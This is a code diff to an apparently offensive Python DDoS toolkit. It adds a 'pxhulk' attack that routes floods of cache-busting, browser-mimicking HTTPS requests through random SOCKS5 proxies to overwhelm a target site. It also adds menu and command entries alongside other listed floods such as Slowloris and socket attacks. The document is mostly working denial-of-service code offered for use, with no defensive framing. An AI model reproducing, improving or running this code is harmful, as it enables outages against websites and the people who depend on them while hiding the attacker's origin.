@@ -868,6 +868,44 @@ def LaunchSKY(url, timer):
                 s.close()
         except:
             s.close()
+#sky
+def attackPXHULK(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchPXHULK, args=(url, timer)).start()
+
+def LaunchPXHULK(url, timer):
+    socksCrawler()  
+    prox = open("./socks5.txt", 'r').read().split('\n')
+    proxy = random.choice(prox).strip().split(":")
+    timelol = time.time() + int(timer)
+    m = random.choice(method)
+    user_agent = random.choice(useragents)
+    req =  m +"?="+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += user_agent +"\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socks.socksocket()
+            s.connect((str(urlparse(url).netloc), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for i in range(200):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
 #gbp
 def attackbypass(url, timer, threads):
     for i in range(int(threads)):
@@ -1024,6 +1062,7 @@ def layer7():
 
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"soc   "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Socket Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk  "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Hulk DoS tool                             "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxhulk"+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Hulk DoS tool                       "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxraw "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxsoc "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxslow"+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Slowloris attack                    "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1153,6 +1192,12 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchHULK(target, thread, t)
+        timer.join()
+    elif command == "pxhulk" or command == "PXHULK":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        attackPXHULK(target, thread, t)
         timer.join()
     elif command == "pxsoc" or command == "PXSOC":
         if get_proxies():
@@ -1288,6 +1333,7 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"hulk       "+Fore.RED+": "+Fore.WHITE+"HULK - HTTP Unbearable Load King\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxhulk     "+Fore.RED+": "+Fore.WHITE+"proxyHULK HTTP Unbearable Load King\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxslow     "+Fore.RED+": "+Fore.WHITE+"Proxy Slowloris attack\n")
